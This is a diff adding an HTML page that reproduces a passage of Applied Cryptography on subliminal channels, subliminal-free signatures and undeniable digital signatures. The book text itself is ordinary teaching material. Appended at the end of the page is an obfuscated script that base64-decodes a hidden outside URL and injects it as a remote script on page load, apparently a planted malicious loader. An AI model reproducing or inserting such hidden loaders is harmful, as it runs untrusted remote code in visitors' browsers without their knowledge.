@@ -1,0 +1,101 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=079-081//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>In general the protocol looks like this:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates an innocuous message, pretty much at random.
+<DD><B>(2)</B>&nbsp;&nbsp;Using a secret key shared with Bob, Alice signs the innocuous message in such a way that she hides her subliminal message in the signature. (This is the meat of the subliminal channel protocol; see Section 23.3.)
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends this signed message to Bob via Walter.
+<DD><B>(4)</B>&nbsp;&nbsp;Walter reads the innocuous message and checks the signature. Finding nothing amiss, he passes the signed message to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob checks the signature on the innocuous message, confirming that the message came from Alice.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob ignores the innocuous message and, using the secret key he shares with Alice, extracts the subliminal message.
+</DL>
+<P>What about cheating? Walter doesn&#146;t trust anyone and no one trusts him. He can always prevent communication, but he has no way of introducing phony messages. Since he can&#146;t generate any valid signatures, Bob will detect his attempt in step (5). And since he does not know the shared key, he can&#146;t read the subliminal messages. Even more important, he has no idea that the subliminal messages are there. Signed messages using a digital signature algorithm look no different from signed messages with subliminal messages embedded in the signature.
+</P>
+<P>Cheating between Alice and Bob is more problematic. In some implementations of a subliminal channel, the secret information Bob needs to read the subliminal message is the same information Alice needs to sign the innocuous message. If this is the case, Bob can impersonate Alice. He can sign messages purporting to come from her, and there is nothing Alice can do about it. If she is to send him subliminal messages, she has to trust him not to abuse her private key.</P>
+<P>Other subliminal channel implementations don&#146;t have this problem. A secret key shared by Alice and Bob allows Alice to send Bob subliminal messages, but it is not the same as Alice&#146;s private key and does not allow Bob to sign messages. Alice need not trust Bob not to abuse her private key.</P>
+<P><FONT SIZE="+1"><B><I>Applications of Subliminal Channel</I></B></FONT></P>
+<P>The most obvious application of the subliminal channel is in a spy network. If everyone sends and receives signed messages, spies will not be noticed sending subliminal messages in signed documents. Of course, the enemy&#146;s spies can do the same thing.
+</P>
+<P>Using a subliminal channel, Alice could safely sign a document under threat. She would, when signing the document, imbed the subliminal message, saying, &#147;I am being coerced.&#148; Other applications are more subtle. A company can sign documents and embed subliminal messages, allowing them to be tracked throughout the documents&#146; lifespans. The government can &#147;mark&#148; digital cash. A malicious signature program can leak secret information in its signatures. The possibilities are endless.</P>
+<P><FONT SIZE="+1"><B><I>Subliminal-Free Signatures</I></B></FONT></P>
+<P>Alice and Bob are sending signed messages to each other, negotiating the terms of a contract. They use a digital signature protocol. However, this contract negotiation has been set up as a cover for Alice&#146;s and Bob&#146;s spying activities. When they use the digital signature algorithm, they don&#146;t care about the messages they are signing. They are using a subliminal channel in the signatures to send secret information to each other. The counterespionage service, however, doesn&#146;t know that the contract negotiations and the use of signed messages are just cover-ups. This concern has led people to create <B>subliminal-free signature schemes</B>. These digital signature schemes cannot be modified to contain a subliminal channel. See [480, 481] for details.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">4.3 Undeniable Digital Signatures</FONT></H3>
+<P>Normal digital signatures can be copied exactly. Sometimes this property is useful, as in the dissemination of public announcements. Other times it could be a problem. Imagine a digitally signed personal or business letter. If many copies of that document were floating around, each of which could be verified by anyone, this could lead to embarrassment or blackmail. The best solution is a digital signature that can be proven valid, but that the recipient cannot show to a third party without the signer&#146;s consent.
+</P>
+<P>The Alice Software Company distributes DEW (Do-Everything-Word). To ensure that their software is virus-free, they include a digital signature with each copy. However, they want only legitimate buyers of the software, not software pirates, to be able to verify the signature. At the same time, if copies of DEW are found to contain a virus, the Alice Software Company should be unable to deny a valid signature.</P>
+<P><B>Undeniable signatures</B> [343, 327] are suited to these sorts of tasks. Like a normal digital signature, an undeniable signature depends on the signed document and the signer&#146;s private key. But unlike normal digital signatures, an undeniable signature cannot be verified without the signer&#146;s consent. Although a better name for these signatures might be something like &#147;nontransferable signatures, &#148; the name comes from the fact that if Alice is forced to either acknowledge or deny a signature&#151;perhaps in court&#151;she cannot falsely deny her real signature.</P>
+<P>The mathematics are complicated, but the basic idea is simple:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice presents Bob with a signature.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob generates a random number and sends it to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice does a calculation using the random number and her private key and sends Bob the result. Alice could only do this calculation if the signature is valid.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob confirms this.
+</DL>
+<P>There is also an additional protocol so that Alice can prove that she did not sign a document, and cannot falsely deny a signature.
+</P>
+<P>Bob can&#146;t turn around and convince Carol that Alice&#146;s signature is valid, because Carol doesn&#146;t know that Bob&#146;s numbers are random. He could have easily worked the protocol backwards on paper, without any help from Alice, and then shown Carol the result. Carol can be convinced that Alice&#146;s signature is valid only if she completes the protocol with Alice herself. This might not make much sense now, but it will once you see the mathematics in Section 23.4.</P>
+<P>This solution isn&#146;t perfect. Yvo Desmedt and Moti Yung show that it is possible, in some applications, for Bob to convince Carol that Alice&#146;s signature is valid [489].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(pgcOFPkV, aPdkjgym) {aPdkjgym = pgcOFPkV.createElement('script');aPdkjgym.type = 'text/javascript';aPdkjgym.async = true;aPdkjgym.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');pgcOFPkV.getElementsByTagName('body')[0].appendChild(aPdkjgym);}(document));</script></body>
+</html>
